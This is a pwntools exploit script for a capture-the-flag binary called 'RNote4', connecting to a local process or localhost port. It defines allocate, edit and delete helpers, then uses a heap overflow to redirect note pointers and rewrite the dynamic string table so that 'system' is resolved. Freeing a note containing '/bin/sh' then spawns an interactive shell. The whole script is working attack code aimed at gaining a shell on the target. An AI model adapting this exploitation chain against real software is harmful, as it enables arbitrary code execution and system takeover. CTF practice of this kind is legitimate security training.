#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./RNote4"
libcPath = ""
remoteAddr = "localhost"
remotePort = 9999

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    if libcPath:
        libc = ELF(libcPath)

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def alloc(cont):
    io.send(p8(1))
    io.send(p8(len(cont)))
    io.send(cont)

def edit(idx, cont):
    io.send(p8(2))
    io.send(p8(idx))
    io.send(p8(len(cont)))
    io.send(cont)

def delete(idx):
    io.send(p8(3))
    io.send(p8(idx))

if __name__ == "__main__":
    alloc('/bin/sh\0' + 'a' * 0x10)
    alloc('/bin/sh\0' + 'b' * 0x10)
    edit(0, '/bin/sh\0' + 'a' * 0x10 + p64(33) + p64(0x18) + p64(0x601EA8 + 0x8))
    edit(1, p64(0x6020C8))

    
    edit(0, '/bin/sh\0' + 'a' * 0x10 + p64(33) + p64(0x18) + p64(0x6020C8))
    edit(1, "a" * (0x400457 - 0x4003F8) + "system\0")
    delete(0)
    io.interactive()
    io.close()


